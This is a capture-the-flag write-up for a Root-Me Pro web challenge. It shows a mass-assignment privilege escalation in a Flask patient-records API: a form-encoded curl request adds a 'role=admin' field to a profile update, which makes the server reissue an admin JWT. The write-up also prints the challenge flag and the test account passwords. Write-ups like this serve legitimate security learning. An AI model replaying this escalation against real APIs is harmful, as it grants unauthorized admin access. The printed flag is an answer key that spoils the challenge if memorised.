# API - Mass Assignment — notes

Target: https://instance-019fe9ed-c810-712c-8f1d-70e178c787a0.challenges.root-me.pro/
Platform: Root-Me Pro | Category: Web | Easy | 200 pts
Reachable over plain HTTPS — no WireGuard needed for this instance.

## Recon

- `Server: Werkzeug/3.1.3 Python/3.12.11` → Flask app.
- `/robots.txt` → 404. `/static/js/custom/script.js` → navbar cosmetics only, nothing useful.
- Forms point at a JSON-ish API:
  - `/api/register` (username, password, full_name, date_of_birth, blood_type)
  - `/api/login` (username, password)
  - `/api/update-profile` (allergies, medications)
- Auth = JWT in a `token` cookie, HS256.
  Payload after login: `{"id":2,"username":null,"role":"patient"}`

## Key finding — the win condition is in the dashboard JS

`/dashboard` inlines a `fetch('/api/patients/2')` and branches on the response:

```js
if (data.role === 'admin') { ... ${data.secret_note} ... }
else { ... normal medical record ... }
```

So the server only emits `secret_note` when the record's role is `admin`.
`/api/patients/<id>` is otherwise properly authorised — ids 1 and 3 return
`{"error":"Access denied - You can only view your own record"}`. No IDOR here.

## Dead end / gotcha — JSON body is silently ignored

First mass-assignment attempt used `Content-Type: application/json`:

```
curl -X POST .../api/update-profile -H 'Content-Type: application/json' \
     -d '{"allergies":"None known","medications":"None","role":"admin"}'
```

Returned `302 -> /dashboard`, looked like success, but the record came back with
`allergies: ""` and `medications: ""` and role unchanged.

The blanking is the tell: the handler reads `request.form`, which does not parse a
JSON body, so every field resolved to empty. **Check the effect of the request, not
just the status code** — a 302 here meant nothing.

Same root cause explains why the original registration stored `patient_name: null`,
`blood_type: null`, `date_of_birth: null` and why the JWT carried `"username": null`
— I had registered with a JSON body too.

## Exploit — form-encoded, extra `role` field

```
curl -b cj.txt -X POST .../api/update-profile \
     -d 'allergies=Penicillin&medications=None&role=admin'
```

The handler assigns every submitted form key onto the user object, so `role` rides
along with the two legitimate fields. Server re-issued the JWT on the spot:

```
set-cookie: token=eyJ...eyJpZCI6MiwidXNlcm5hbWUiOm51bGwsInJvbGUiOiJhZG1pbiJ9...
                       -> {"id":2,"username":null,"role":"admin"}
```

Then `/api/patients/2` returned the extra admin-only field:

```json
{ "id": 2, "role": "admin", "allergies": "Penicillin",
  "secret_note": "RM{880b92753b79ce8a6a5e642d9012a527}", ... }
```

## Verified: /api/register is NOT vulnerable

I initially assumed register had the same bug. Tested it — it does not:

```
curl -X POST .../api/register \
     -d 'username=pauk2&...&blood_type=O%2B&role=admin'
```

New user id 3 came back `"role": "patient"`. Registration hardcodes/whitelists the
role; it only needed form encoding to store the profile fields correctly.
`/api/update-profile` is the single vulnerable endpoint.

## Flag

```
RM{880b92753b79ce8a6a5e642d9012a527}
```

## Accounts created

- `pauk1` / `Passw0rd123` — id 2, escalated to admin (this is the solve account)
- `pauk2` / `Passw0rd123` — id 3, control account proving register is safe
